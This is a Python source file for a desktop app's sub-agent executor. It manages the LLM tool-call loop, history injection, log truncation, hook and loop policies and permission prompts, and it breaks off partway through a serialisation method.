# -*- coding: utf-8 -*-
"""
子智能体执行器 - 独立运行子智能体任务，避免共享超长上下文
"""

import functools
import re
import threading
import time
from contextlib import contextmanager
from typing import Any, Dict, List, Optional

import orjson
import orjson as json
from loguru import logger
from PyQt5.QtCore import QThread, pyqtSignal

from app.constants import PARAM_SCHEMA
from app.constants import PROVIDER_MANAGED_KEYS
from app.constants import provider_quota_exclude_keys as QUOTA_EXCLUDE_KEYS
from app.core.conversation.message_content import extract_reasoning_delta
from app.core.modelmeta.model_capabilities import (
    ABSOLUTE_FALLBACK_CEILING,
    get_caps_max_output_tokens,
    normalize_reasoning_effort,
    resolve_context_limit,
    resolve_max_output_tokens,
    resolve_model_capabilities,
)
from app.core.modelmeta.provider_profile import get_provider_profile, resolve_extra_headers
from app.core.tools.tool_call_parser import smart_parse_arguments
from app.plugins.contracts.loop_policy import LoopDecision, LoopState
from app.tools.result import ToolResult

# ========== 性能优化：预编译正则表达式 ==========
_THINKING_PATTERN = re.compile(r"<think>[\s\S]*?</think>")  # 过滤完整思考块
# 与 plugins/system-model-adapters/model_adapters/_detectors.py 的判定保持同步
# （Phase 3 搬迁进 adapter flags 时统一，消除重复实现）
_GPT_VERSIONED_RE = re.compile(r"^gpt-(\d+)")
_TOOL_TAG_PATTERN = re.compile(r"<tool>[\s\S]*?</tool>")  # 过滤工具调用标签
_VALID_IDENTIFIER_PATTERN = re.compile(r"^[a-zA-Z_][a-zA-Z0-9_]*$")  # 验证标识符格式

# 仅作「上下文窗口」语义的键（P1-21 语义拆分后不再作为输出上限发出）。
# 这些键的 api_param 也是 "max_tokens"（历史字段名），若不排除会在通配分支里
# 与「最大输出」抢同一个 req_kwargs["max_tokens"]（按 dict 迭代序覆盖）。
_CONTEXT_WINDOW_ONLY_KEYS = frozenset({"最大Token", "上下文长度"})

# ========== 上下文注入预算常量 ==========
CHARS_PER_TOKEN = 4  # 与 HistoryCompactor 保持一致
_CONTEXT_INJECTION_RATIO = 0.6  # 上下文注入最多占 budget 的 60%
# 最终总结提示词兕底文案（激活策略无 final_summary_prompt 时使用，内容与原硬编码等价）
_FALLBACK_FINAL_SUMMARY_PROMPT = """

## 已达到最大迭代次数限制，请总结当前执行结果。

请整理并返回以下内容：
1. 已完成的工作
2. 关键发现和结论
3. 重要文件路径和数据
4. 待解决的问题（如有）

直接输出总结内容："""


def _compute_context_budget(llm_config: Dict) -> int:
    """
    计算当前模型的上下文 token 预算。
    逻辑与 HistoryCompactor.get_budget() 保持一致。

    Args:
        llm_config: 模型配置字典

    Returns:
        可用于历史的 token 预算
    """
    if not isinstance(llm_config, dict):
        logger.warning(
            f"[SubAgentExecutor] _compute_context_budget received non-dict llm_config: {type(llm_config).__name__}, using defaults"
        )
        return 96000  # 默认 128k * 0.75

    context_limit = resolve_context_limit(llm_config)
    max_output_tokens = resolve_max_output_tokens(llm_config)

    # O1/O3 模型需要更大的输出预留
    model_name = str(llm_config.get("模型名称", "") or llm_config.get("model", "")).lower()
    reserved = min(800, max_output_tokens)
    if "o1" in model_name or "o3" in model_name:
        reserved = min(max_output_tokens, 32000)

    return max(500, context_limit - reserved)


# [H5] tool_result 日志预览上限。UI 完整视图本就只渲染前 2000 字符
# （session_card._format_content_full 同值截断），全文驻留 logs 无任何消费方，
# 却是任务日志内存膨胀主因（T13 实测重度 200 条 793MB/窗口，静置不回落）。
_LOG_RESULT_PREVIEW_CHARS = 2000

# [H5-2 补漏] ai_response/thinking 的 UI 完整视图上限（session_card.py 同值 10000）；
# tool_call.args 序列化字符串的 UI 上限（session_card 同值 3000）。日志侧先截，
# UI 显示逐字不变（UI 自己的截断分支不再触发，内容一致）。
_LOG_TEXT_PREVIEW_CHARS = 10000
_LOG_ARGS_PREVIEW_CHARS = 3000


def _cap_str(value, limit, tag):
    """超长字符串截断并附原长标记（非字符串原样返回）。"""
    if isinstance(value, str) and len(value) > limit:
        return value[:limit] + f"\n…（{tag}已截断，全文 {len(value)} 字符）"
    return value


def _cap_args_tree(obj, limit, depth=0):
    """递归截断 args（dict/list）中的超长字符串值，保持容器类型不变
    （UI 读侧对 args 做 orjson.dumps，类型契约不可破坏）。"""
    if depth > 4:
        return obj
    if isinstance(obj, str):
        if len(obj) > limit:
            return obj[:limit] + f"…（参数已截断，全文 {len(obj)} 字符）"
        return obj
    if isinstance(obj, dict):
        return {k: _cap_args_tree(v, limit, depth + 1) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_cap_args_tree(v, limit, depth + 1) for v in obj]
    return obj

def _in_flight(method):
    """标记「有阻塞操作在途」：期间 stall 看门狗不得按日志静默误杀。

    长思考流式聚合、API 重试退避、长工具执行都是合法静默；退出时刷新活跃
    时间，避免用进入前的旧时间戳被下一拍判超时。装饰器保留可重入语义。
    """

    @functools.wraps(method)
    def wrapper(self, *args, **kwargs):
        with self._in_flight_phase():
            return method(self, *args, **kwargs)

    return wrapper

class SubAgentExecutor(QThread):
    """子智能体执行器 - 独立线程运行子智能体任务"""

    finished_with_result = pyqtSignal(str, str)  # task_id, result
    error_occurred = pyqtSignal(str, str)  # task_id, error
    progress_updated = pyqtSignal(str, str)  # task_id, message
    tool_call_started = pyqtSignal(str, str, dict)  # task_id, tool_name, args
    tool_result_received = pyqtSignal(str, str, str, bool)  # task_id, tool_name, result, success
    token_usage_updated = pyqtSignal(str, int, int, int)  # task_id, prompt_tokens, completion_tokens, total_tokens
    thinking_received = pyqtSignal(str, str)  # task_id, reasoning_content
    # ★ T24：ask 行为权限请求（task_id, tool_name, arguments）→ 主线程弹窗
    permission_requested = pyqtSignal(str, str, dict)

    def __init__(
        self,
        task_id: str,
        agent_name: str,
        task_description: str,
        llm_config: Dict,
        agent_manager: Any,
        tool_executor: Any = None,
        parent_context: str = "",
        is_subagent_call: bool = True,  # 标记是否为被主智能体调用（通过 subagent_para）
        max_iterations: Optional[
            int
        ] = None,  # 轮数上限（per-agent steps 优先）；None=走激活策略（默认 subagent 策略 30）
        hook_policy_id: Optional[str] = None,  # 子智能体域 hook 策略插件 id（plugins/system-hook-policies/hook_policies/）
    ):
        super().__init__()
        self.task_id = task_id
        self.agent_name = agent_name
        self.task_description = task_description
        self.llm_config = llm_config
        self.agent_manager = agent_manager
        self.tool_executor = tool_executor
        self.parent_context = parent_context
        self.is_subagent_call = is_subagent_call  # 传递给提示词构建
        self.max_iterations = max_iterations  # 轮数上限（None=走激活策略）
        # 子智能体域 hook 策略：默认 None → 走 plugins/system-hook-policies/hook_policies/ 的
        # "subagent_default"（仅工具级 + Stop + PluginChanged）。可显式传 id 覆盖。
        self._hook_policy_id = hook_policy_id
        self._hook_policy_obj = None  # 懒解析缓存
        self._is_cancelled = False
        self._cancel_reason = "Task cancelled"
        self._pending_answer = None
        self._last_result = None
        self._execution_error = None
        # 在途阶段（API/工具）计数：>0 表示阻塞操作正在执行，stall 看门狗豁免
        self._in_flight_depth = 0
        self._in_flight_since: Optional[float] = None
        # ★ T24：ask 权限等待（主线程弹窗响应后 set event，超时按拒绝）
        self._permission_event = threading.Event()
        self._permission_allow = False
        self._permission_answered = False
        self._start_time: Optional[float] = None  # Unix timestamp, 访问用 @property
        self._last_activity_time: float = time.time()  # 最后活跃时间戳（日志/API/工具），供外部 stall 检测
        # 日志存储: [{"type": "progress"|"thinking"|"ai_response"|"tool_call"|"tool_result"|"finish", "content": str, "timestamp": float}]
        self._logs: List[Dict] = []
        self._tool_call_count = 0
        self._log_store_callback = None  # 日志存储回调
        self._get_history_messages = None  # 获取主智能体历史消息的回调
        # Token 用量追踪
        self._total_prompt_tokens: int = 0  # 累计 prompt tokens
        self._total_completion_tokens: int = 0  # 累计 completion tokens
        self._total_tokens: int = 0  # 累计总 tokens（用于计费统计）
        self._peak_total_tokens: int = 0  # 单次 API 调用的峰值总 tokens（反映上下文窗口压力）

    @property
    def total_tokens(self) -> int:
        """获取累计 token 总数（供 UI 显示）"""
        return self._total_tokens

    @property
    def start_time(self) -> Optional[float]:
        """获取任务开始时间戳（供 SubAgentManager 超时检测使用）"""
        return self._start_time

    @property
    def tool_call_count(self) -> int:
        """获取工具调用次数（供 SubAgentManager 使用）"""
        return self._tool_call_count

    @property
    def last_result(self) -> Optional[str]:
        """获取最终结果（供 SubAgentManager 使用）"""
        return self._last_result

    @property
    def execution_error(self) -> Optional[str]:
        """获取执行错误（供 SubAgentManager 使用）"""
        return self._execution_error

    def get_last_activity_time(self) -> float:
        """获取最后活跃时间戳（供 SubAgentManager stall 检测使用）"""
        return self._last_activity_time

    def get_in_flight_duration(self) -> Optional[float]:
        """当前在途操作已持续秒数；不在途返回 None（stall 看门狗据此豁免）。"""
        if self._in_flight_depth <= 0 or self._in_flight_since is None:
            return None
        return time.time() - self._in_flight_since

    @contextmanager
    def _in_flight_phase(self):
        """可重入在途区间。最外层进入记起点，最外层退出刷新活跃时间。"""
        self._in_flight_depth += 1
        if self._in_flight_depth == 1:
            self._in_flight_since = time.time()
        try:
            yield
        finally:
            self._in_flight_depth -= 1
            if self._in_flight_depth == 0:
                self._in_flight_since = None
                self._last_activity_time = time.time()

    def set_log_store_callback(self, callback):
        """设置日志存储回调"""
        self._log_store_callback = callback

    def set_history_getter(self, getter: callable):
        """
        设置获取历史消息的回调。

        Args:
            getter: callable, 返回 List[Dict]，每个 dict 包含 role/content
        """
        self._get_history_messages = getter

    def cancel(self, reason: str = "Task cancelled"):
        """置取消标志并记录真因；worker 终态归档/信号统一读 _cancel_reason。

        旧调用方（cancel_task / stop_task）不传参，行为与改前一致。
        """
        # 仅首次置位写真因：stall 后窗口关闭等二次 cancel() 不得覆盖
        if not self._is_cancelled:
            self._cancel_reason = reason or "Task cancelled"
        self._is_cancelled = True

    def provide_answer(self, answer: str):
        self._pending_answer = answer

    def _build_inherited_context(self, agent, history_messages: List[Dict]) -> List[Dict]:
        """
        基于 context budget 构建主智能体历史上下文注入。

        策略：
        1. 获取模型 context budget（token 数）
        2. 按比例计算可用 token
        3. 从最新消息向前填充，保持每条消息完整（不截断内容）
        4. 将消息作为原始 message 对象返回（保留 role/content），
           以支持 API provider 的 prompt caching
        5. 超出 budget 时整条消息丢弃（不截断内容）

        Args:
            agent: Agent 配置对象
            history_messages: 主智能体的历史消息列表

        Returns:
            保留原始格式的消息列表（List[Dict]），无内容时返回空列表
        """
        if not history_messages:
            return []

        # 获取预算比例（优先从 agent 配置读取）
        budget_ratio = (
            getattr(agent, "inherit_history_budget_ratio", _CONTEXT_INJECTION_RATIO) or _CONTEXT_INJECTION_RATIO
        )
        # 确保比例在合理范围内
        budget_ratio = max(0.1, min(0.8, float(budget_ratio)))

        # 计算可用 token 预算
        budget_tokens = _compute_context_budget(self.llm_config)
        max_context_tokens = int(budget_tokens * budget_ratio)
        if max_context_tokens <= 0:
            return []

        # 从最新消息向前填充，保持消息完整
        selected_messages = []
        remaining_tokens = max_context_tokens

        for msg in reversed(history_messages):
            role = msg.get("role", "user")
            # 跳过 tool 角色消息（工具结果很长且与 assistant 消息隐含关联）
            if role == "tool":
                continue

            # 预估消息的 token 数
            content = msg.get("content", "")
            if isinstance(content, list):
                # multimodal 内容（图文混合），只从 text 部分估算
                content_text = "".join(c.get("text", "") for c in content if isinstance(c, dict))
            elif isinstance(content, str):
                content_text = content
            else:
                content_text = str(content) if content else ""

            # 无内容的消息跳过
            if not content_text and not isinstance(content, list):
                continue

            # token 数估算（1 token ≈ 4 字符，+4 角色开销）
            msg_tokens = max(1, len(content_text) // CHARS_PER_TOKEN) + 4

            if msg_tokens <= remaining_tokens:
                # 完整消息放得下，保留原始格式
                clean_msg = {"role": role}
                if isinstance(content, list):
                    clean_msg["content"] = content  # 保留 multimodal 原始格式
                elif isinstance(content, str):
                    clean_msg["content"] = content
                else:
                    clean_msg["content"] = str(content) if content else ""
                selected_messages.append(clean_msg)
                remaining_tokens -= msg_tokens
            else:
                # 放不下则停止（不截断内容）
                break

        # 翻转回正序
        selected_messages.reverse()
        return selected_messages

    def _add_log(self, log_type: str, content: str, extra: dict = None):
        """记录日志"""
        import time

        now = time.time()
        # [H5-2 补漏] ai_response/thinking 截 10000、tool_call 参数截 3000：
        # 与 session_card.py UI 显示上限逐字对齐，用户看到的内容不变；
        # 日志驻留从「全文」降为「预览」，与 tool_result 同语义。
        if log_type in ("thinking", "ai_response"):
            content = _cap_str(content, _LOG_TEXT_PREVIEW_CHARS, "内容")
        log_entry = {
            "type": log_type,
            "content": content,
            "timestamp": now,
        }
        if extra:
            if log_type == "tool_call" and isinstance(extra.get("args"), dict):
                capped = _cap_args_tree(extra["args"], _LOG_ARGS_PREVIEW_CHARS)
                # [T25] 单值截 3000 不够：multi_edit.edits 20 项 / subagent_para.tasks[]
                # 等多项容器叠加仍可几十 KB。总量判定：序列化超 2×3000 则整体替换
                # 为占位 dict（保持 JSON 可序列化，UI orjson.dumps 契约不破）。
                try:
                    if len(orjson.dumps(capped).decode()) > _LOG_ARGS_PREVIEW_CHARS * 2:
                        capped = {
                            "_truncated": True,
                            "_original_len": len(orjson.dumps(extra["args"]).decode()),
                            "_preview": orjson.dumps(capped).decode()[:_LOG_ARGS_PREVIEW_CHARS],
                        }
                except Exception:
                    pass  # 序列化兜底：极端不可序列化值保持逐值截断结果
                extra["args"] = capped
            log_entry.update(extra)
        # [H5] tool_result 全文驻留是日志膨胀主因：日志侧只存 2KB 级预览 +
        # 原始长度字段（便于定位最重工具）。执行链消息（raw_result）与此独立，
        # 模型拿到的仍是全文，子智能体行为不变；UI 完整视图本就只显示前
        # 2000 字符（session_card._format_content_full），显示内容不变。
        if log_type == "tool_result":
            _raw = log_entry.get("result")
            if isinstance(_raw, str) and len(_raw) > _LOG_RESULT_PREVIEW_CHARS:
                log_entry["result_original_len"] = len(_raw)
                log_entry["result"] = (
                    _raw[:_LOG_RESULT_PREVIEW_CHARS]
                    + f"\n…（结果过长，已截断；全文 {len(_raw)} 字符）"
                )
        self._logs.append(log_entry)
        # 每次输出日志都刷新活跃时间（供外部 stall 检测）
        self._last_activity_time = now
        # 实时保存到数据库
        log_callback = getattr(self, "_log_store_callback", None)
        if log_callback:
            try:
                log_callback(
                    self.task_id,
                    self.agent_name,
                    self.task_description,
                    "running",
                    None,
                    None,
                    self._logs,
                    self.get_summary(),
                )
            except Exception as e:
                logger.warning(f"[SubAgentExecutor] 实时保存日志失败: {e}")

    def get_logs(self) -> List[Dict]:
        """获取所有日志"""
        return self._logs.copy()

    def get_summary(self) -> dict:
        """获取任务摘要"""
        import time

        elapsed = int(time.time() - self._start_time) if self._start_time else 0
        # 从 llm_config 提取模型名称
        _model = ""
        if isinstance(self.llm_config, dict):
            _model = str(self.llm_config.get("模型名称", "") or self.llm_config.get("model", "") or "")
        # token 显示（使用单次 API 调用的峰值，反映上下文窗口压力而非累计计费）
        _ctx_display = ""
        if self._peak_total_tokens > 0:
            t = self._peak_total_tokens
            _ctx_display = f"{t / 1000:.1f}K tokens" if t >= 1000 else f"{t} tokens"
        return {
            "task_id": self.task_id,
            "agent_name": self.agent_name,
            "task_description": self.task_description,
            "tool_call_count": self._tool_call_count,
            "elapsed_seconds": elapsed,
            "result": self._last_result,
            "error": self._execution_error,
            "model_name": _model,
            "context_usage": _ctx_display,
            "total_tokens": self._peak_total_tokens,
        }

    def run(self):
        import time

        self._start_time = time.time()

        # [T15/M6] 退出期中断检查：atexit 收敛时尽快返回，不拖 wait(500)
        if self.isInterruptionRequested():
            return

        try:
            # 防御：确保 llm_config 是 dict
            if not isinstance(self.llm_config, dict):
                logger.warning(
                    f"[SubAgentExecutor] run() llm_config is not a dict: {type(self.llm_config).__name__}={self.llm_config!r}"
                )
                self.llm_config = {}

            agent = self.agent_manager.get_agent(self.agent_name)
            if not agent:
                # 必须发 error_occurred：裸 return 会让完成链（批次计数/汇总
                # 注入）永远等不到该任务的终态，批次通知永久缺席
                self._execution_error = f"Agent not found: {self.agent_name}"
                self.error_occurred.emit(self.task_id, self._execution_error)
                return

            # 子智能体被调用时 is_subagent_call=True，此时应该使用 subagent_constraints
            # 用于区分"主智能体通过 subagent_para 调用子智能体"的情况
            # 【修复】补 extra_context（project_root/project_name），
            # 让 read_project_notes / inject_skills_content 能正确注入项目笔记和技能配置
            _sub_workdir = ""
            _sub_project_name = ""
            try:
                if self.tool_executor and hasattr(self.tool_executor, "get_workdir"):
                    _sub_workdir = self.tool_executor.get_workdir() or ""
            except Exception:
                pass
            try:
                from app.utils.config import Settings

                _sub_project_name = Settings.get_instance().llm_project_name.value or "DriFoxx"
            except Exception:
                pass
            system_prompt = self.agent_manager.get_agent_system_prompt(
                self.agent_name,
                is_subagent_call=self.is_subagent_call,
                extra_context={
                    "project_root": _sub_workdir,
                    "project_name": _sub_project_name,
                },
            )
            # 传入当前窗口的 builtin_tools 实例，确保 is_in_team 检查使用正确窗口的 team_window_id
            _bt = self.tool_executor._builtin_tools if self.tool_executor else None
            tools = self.agent_manager.get_agent_tools_schema(
                self.agent_name, is_subagent_call=self.is_subagent_call, builtin_tools=_bt
            )
            # ★ T24（按产品指示修订）：**不做** controller schema 过滤——
            # 工具定义保持静态完整（prompt 缓存稳定），禁用/询问全部由
            # 执行层 _check_ui_tool_permission 实时控制（UI 调整立即生效）。

            # 基于 context budget 构建主智能体历史上下文注入（返回消息对象列表）
            inherited_messages = []
            if agent.inherit_history and getattr(self, "_get_history_messages", None):
                try:
                    history_messages = self._get_history_messages() or []
                    if history_messages:
                        # 根据 inherit_history_count 限制消息数量
                        if agent.inherit_history_count is not None:
                            history_messages = history_messages[-agent.inherit_history_count :]

                        inherited_messages = self._build_inherited_context(agent, history_messages)
                except Exception as e:
                    logger.warning(f"[SubAgentExecutor] 获取历史消息失败: {e}")

            # 过滤父智能体上下文中的 <tool> 和 <think> 标签，避免污染子智能体的工具调用格式
            sanitized_context = _TOOL_TAG_PATTERN.sub("", self.parent_context)
            sanitized_context = _THINKING_PATTERN.sub("", sanitized_context)

            # 构建子智能体消息列表（4层结构，实现 prompt caching）
            messages = []
            # Layer 1: 继承的主智能体消息（原始 message 格式，完整保留 role/content）
            #          相同前缀可被 API provider 缓存，提升后续调用性能
            messages.extend(inherited_messages)
            # Layer 2: 父智能体说明
            messages.append({"role": "system", "content": f"## 父智能体说明\n{sanitized_context}"})
            # Layer 3: 子智能体提示词（作为最后一条 system 消息，权重最高）
            messages.append({"role": "system", "content": system_prompt})
            # Layer 4: 子任务
            messages.append({"role": "user", "content": f"## 子任务\n{self.task_description}"})

            self._add_log("progress", f"开始执行子任务: {self.agent_name}")
            self.progress_updated.emit(self.task_id, f"开始执行子任务: {self.agent_name}")

            try:
                result = self._execute_agent_loop(messages, tools, self.llm_config)
            except Exception as e:
                logger.error(f"[SubAgentExecutor] _execute_agent_loop error: {e}")
                result = f"执行出错: {str(e)}"

            if self._is_cancelled:
                # 被取消时也要发射错误信号，让管理器知道任务已结束。
                # 真因来自 cancel(reason)：stall / 窗口关闭 / 手动中止各有文案，
                # 不得再统一覆写成 "Task cancelled"，否则会话卡只剩笼统失败。
                cancel_error = getattr(self, "_cancel_reason", None) or "Task cancelled"
                self._execution_error = cancel_error
                logger.warning(
                    f"[SubAgentExecutor] Task {self.task_id} ({self.agent_name}) cancelled "
                    f"({cancel_error}), emitting error_occurred"
                )
                if self._log_store_callback:
                    try:
                        self._log_store_callback(
                            self.task_id,
                            self.agent_name,
                            self.task_description,
                            "cancelled",
                            "",
                            cancel_error,
                            self._logs,
                            self.get_summary(),
                        )
                    except Exception as e:
                        logger.warning(f"[SubAgentExecutor] 保存取消状态失败: {e}")
                self.error_occurred.emit(self.task_id, cancel_error)
                return

            # 直接使用执行结果（迭代结束时已自动总结）
            self._last_result = result if result else "无执行结果"

            # 任务完成，保存最终状态
            if self._log_store_callback:
                try:
                    self._log_store_callback(
                        self.task_id,
                        self.agent_name,
                        self.task_description,
                        "finished",
                        self._last_result,
                        None,
                        self._logs,
                        self.get_summary(),
                    )
                except Exception as e:
                    logger.warning(f"[SubAgentExecutor] 保存完成状态失败: {e}")

            self.finished_with_result.emit(self.task_id, self._last_result)

        except Exception as e:
            logger.exception(f"[SubAgentExecutor] run() error: {e}")
            self._execution_error = str(e)
            # 任务出错，保存错误状态
            if self._log_store_callback:
                try:
                    self._log_store_callback(
                        self.task_id,
                        self.agent_name,
                        self.task_description,
                        "error",
                        None,
                        self._execution_error,
                        self._logs,
                        self.get_summary(),
                    )
                except Exception as e:
                    logger.warning(f"[SubAgentExecutor] 保存错误状态失败: {e}")
            self.error_occurred.emit(self.task_id, f"SubAgent execution error: {str(e)}")

    def _execute_agent_loop(self, messages: List[Dict], tools: List[Dict], llm_config: Dict) -> str:
        """执行子智能体对话循环"""
        current_messages = messages.copy()
        # [方案 A] 继承历史的 image_ref 块携带真实落盘 session_id（revive 后丢失），
        # 在首次 serialize 前收集作为 revoke 的候选目录
        self._vision_session_ids = self._collect_vision_session_ids(current_messages)
        response_content = ""
        current_reasoning = ""  # DeepSeek V4 thinking mode
        iteration_count = 0
        # 工具「本轮收尾」请求（ToolResult.end_turn），每次任务重置
        self._end_turn_requested = False
        # LoopPolicy：轮数上限（per-agent steps 优先，激活策略兜底，默认 30）
        round_limit = self._resolve_round_limit()

        while not self._is_cancelled:
            if self._is_cancelled:
                return ""

            # 每次迭代开始前刷新活跃时间（即将调 API，算作活跃）
            self._last_activity_time = time.time()

            # LoopPolicy：轮数上限判定 + 策略门控（默认 subagent 策略到限即停，
            # 插件策略可改判 CONTINUE 放行进入正常轮次）
            iteration_count += 1
            if round_limit is not None and iteration_count > round_limit:
                _lp_state = LoopState(round_count=iteration_count)
                if self._loop_policy().should_continue(_lp_state) is not LoopDecision.CONTINUE:
                    self._add_log("progress", f"已达到最大迭代次数 ({round_limit})，强制结束并总结")
                    final_summary_prompt = self._final_summary_prompt()
                    current_messages.append({"role": "user", "content": final_summary_prompt})
                    # 强制续命前也触发 PreAssistantMessage（与正常轮次一致）
                    self._trigger_hook_sync("PreAssistantMessage", current_messages)
                    response_content, _, _ = self._make_api_call(current_messages, None, llm_config)
                    # [方案 A] 强制总结轮收尾：迭代间回收 data URI，下轮 serialize 幂等读回
                    self._revoke_vision_after_send(current_messages)
                    return self._filter_thinking_content(response_content)

            # ====== PreAssistantMessage hook：每次 API 调用前触发 ======
            # 同步触发，hook 输出追加到 current_messages，让 LLM 在下一轮请求中看到
            self._trigger_hook_sync("PreAssistantMessage", current_messages)

            response_content, tool_calls, reasoning_content = self._make_api_call(current_messages, tools, llm_config)
            # [方案 A] 每轮发送收尾：回收 data URI（迭代间不驻留），下轮 revive 幂等读回
            self._revoke_vision_after_send(current_messages)
            current_reasoning = reasoning_content

            # ====== PostAssistantMessage hook：assistant 响应后触发 ======
            # 注入 response_content（_make_api_call 拿到的纯文本）作为上下文，
            # 让 hook 能基于最近一次回复做检查（如敏感词、协议格式等）
            self._trigger_hook_sync(
                "PostAssistantMessage",
                current_messages,
                extra_context={"assistant_response": response_content or ""},
            )

            # 记录大模型生成内容（thinking + ai_response），排除工具调用结果
            if current_reasoning:
                self._add_log("thinking", current_reasoning)
                # 实时推送到 UI（浮动卡片可即时显示思考内容）
                self.thinking_received.emit(self.task_id, current_reasoning)
            if response_content:
                self._add_log("ai_response", response_content)

            if self._is_cancelled:
                return ""

            # 没有工具调用，直接返回结果（提前有结果了）
            if not tool_calls:
                # 【修复】将 reasoning_content 以 <think> 标签嵌入结果文本，
                # 前端 _inject_think_cards 会自动渲染为可折叠思考块
                if current_reasoning:
                    return f"<think>{current_reasoning}</think>\n\n{response_content}"
                return response_content

            # DeepSeek V4 thinking mode: 需要传递 reasoning_content
            assistant_msg = {
                "role": "assistant",
                "content": response_content,
                "tool_calls": tool_calls,
            }
            if current_reasoning:
                assistant_msg["reasoning_content"] = current_reasoning
            elif self._requires_reasoning_content(llm_config):
                # 上游要求 thinking mode 下 tool_calls assistant 必须带 reasoning_content 字段（可为空串）
                assistant_msg["reasoning_content"] = ""
            current_messages.append(assistant_msg)

            tool_results, hook_messages = self._execute_tools(tool_calls)

            if tool_results is None:
                while self._pending_answer is None and not self._is_cancelled:
                    time.sleep(0.1)

                if self._is_cancelled:
                    return ""

                current_messages.append(
                    {
                        "role": "tool",
                        "tool_call_id": self._question_pending["tool_call_id"],
                        "content": self._pending_answer,
                    }
                )
                self._pending_answer = None
                continue

            # 先 extend tool_results（纯 role="tool" 消息，紧跟在 assistant(tool_calls) 之后），
            # 再 extend hook_messages（role="user" 消息，避免插入 tool_calls 和 tool 之间导致 2013 错误）
            current_messages.extend(tool_results)
            current_messages.extend(hook_messages)

            # 工具请求本轮收尾（ToolResult.end_turn）：不再发起下一轮 API 调用
            if getattr(self, "_end_turn_requested", False):
                self._add_log("progress", "工具要求本轮收尾，提前结束子智能体循环")
                if current_reasoning:
                    return f"<think>{current_reasoning}</think>\n\n{response_content}"
                return response_content
            # [T4-3] 已删除 `QCoreApplication.processEvents()` 与 `time.sleep(0.2)`：
            # 本循环运行在子智能体的 QThread 子线程里，子线程没有 Qt 事件循环，
            # processEvents() 是纯空转；sleep 只阻塞子线程自己，对主线程无任何
            # 让出效果，却让每轮工具循环多花 200ms。勿回加。

        # 【修复】将 reasoning_content 以 <think> 标签嵌入结果文本，
        # 前端 _inject_think_cards 会自动渲染为可折叠思考块
        if current_reasoning:
            return f"<think>{current_reasoning}</think>\n\n{response_content}"
        return response_content

    # ===== LoopPolicy 接入（scope="subagent"）=====

    _loop_policy_obj = None  # 懒解析缓存（激活策略）

    def _loop_policy(self):
        """当前激活的子智能体循环策略（scope=subagent，默认 subagent 策略兜底）"""
        if self._loop_policy_obj is None:
            from app.plugins.registries.loop_policy_registry import LoopPolicyRegistry

            self._loop_policy_obj = LoopPolicyRegistry.get_instance().get_active("subagent")
        return self._loop_policy_obj

    # ===== HookPolicy 接入（scope="subagent"）=====

    def _hook_policy_obj_resolve(self):
        """当前激活的子智能体 hook 触发策略对象

        优先级：_hook_policy_id 显式 id > 默认 scope=subagent 的激活策略
        （默认 plugins/system-hook-policies/hook_policies/subagent_default.py，仅工具级 + Stop +
        PluginChanged）。Registry 未加载时回退到内置 SubagentDefaultHookPolicy（保持
        现状行为：仅工具级 + Stop + PluginChanged）。
        """
        if self._hook_policy_obj is not None:
            return self._hook_policy_obj
        try:
            from app.plugins.registries.hook_policy_registry import HookPolicyRegistry
            from app.plugins.contracts.hook_policy import SCOPE_SUBAGENT

            registry = HookPolicyRegistry.get_instance()
            self._hook_policy_obj = registry.get_active(SCOPE_SUBAGENT)
            if self._hook_policy_id and self._hook_policy_obj.id != self._hook_policy_id:
                if registry.set_active(self._hook_policy_id, SCOPE_SUBAGENT):
                    self._hook_policy_obj = registry.get_active(SCOPE_SUBAGENT)
        except Exception as exc:
            logger.warning(f"[SubAgent] HookPolicy resolve 异常，回退内置默认: {exc!r}")
            from app.plugins.contracts.hook_policy import (
                HookDecision,
                HookEvent,
                PluginChangedEvent,
                PostToolUseEvent,
                PreToolUseEvent,
                StopEvent,
            )

            class _FallbackSubagent:
                id = "subagent_default"
                scope = "subagent"

                def should_trigger(self, event: HookEvent) -> HookDecision:
                    if isinstance(event, (PreToolUseEvent, PostToolUseEvent, StopEvent, PluginChangedEvent)):
                        return HookDecision.TRIGGER
                    return HookDecision.SKIP

            self._hook_policy_obj = _FallbackSubagent()
        return self._hook_policy_obj

    def _should_run_hook(self, event) -> bool:
        """按 _hook_policy_obj 判定给定事件是否触发"""
        try:
            policy = self._hook_policy_obj_resolve()
            return policy.should_trigger(event).value == "trigger"
        except Exception:
            return True  # 异常保守放行

    def _resolve_round_limit(self) -> Optional[int]:
        """轮数上限：per-agent steps（max_iterations）显式声明优先，否则激活策略兜底（默认 30）。"""
        if self.max_iterations is not None:
            return self.max_iterations
        try:
            return self._loop_policy().max_rounds(self.llm_config or {})
        except Exception as exc:
            logger.warning(f"[SubAgentExecutor] LoopPolicy max_rounds 调用异常，回退默认 30: {exc!r}")
            return 30

    def _final_summary_prompt(self) -> str:
        """最终总结提示词：激活策略提供（SubagentLoopPolicy），异常时回退内置文案"""
        try:
            fn = getattr(self._loop_policy(), "final_summary_prompt", None)
            if callable(fn):
                prompt = fn()
                if isinstance(prompt, str) and prompt:
                    return prompt
        except Exception as exc:
            logger.warning(f"[SubAgentExecutor] LoopPolicy final_summary_prompt 调用异常，用内置文案: {exc!r}")
        return _FALLBACK_FINAL_SUMMARY_PROMPT

    def _filter_thinking_content(self, content: str) -> str:
        """过滤掉思考内容，只保留纯回复"""
        if not content:
            return content
        return _THINKING_PATTERN.sub("", content)

    def _serialize_for_api(
        self, messages: List[Dict], llm_config: Dict = None, revoke_after: bool = True
    ):
        """序列化单入口（Phase C）：adapter flags → serializer_id → 序列化器 → SerializeResult。

        与 chat_worker._serialize_for_api 对称；supports_vision 默认 True（subagent 无视觉注入）。

        [方案 A] 出口即回收（revoke_after=True 默认）：revive 产出的 data:image 块
        在返回前还原为 image_ref 引用块（与 chat_worker 出口回收口径一致）。
        落盘 session_id 用 _vision_session_ids 候选集合（继承历史的真实 sid，
        revoke 侧逐目录存在性探测，全部不命中安全降级保留）。
        """
        from app.plugins.contracts.message_serializer import SerializeContext
        from app.plugins.registries.serializer_registry import SerializerRegistry

        # [方案 1] image_ref → data:image 读侧恢复（persist 的逆操作）；
        # 缺失文件降级 text 占位块，不抛错。与 chat_worker 对称——
        # 继承的主智能体历史可能含用户发送的图片（image_ref），不恢复会以
        # 内部格式漏进 API content 数组（type=image_ref 非法，同样触发 400）
        try:
            from app.core.store.session_repository import revive_vision_image_refs

            messages = revive_vision_image_refs(messages)
        except Exception as e:  # noqa: BLE001 — revive 失败不阻断发送
            logger.warning(f"[SubAgentWorker] revive image_refs 失败（按原消息发送）: {e}")

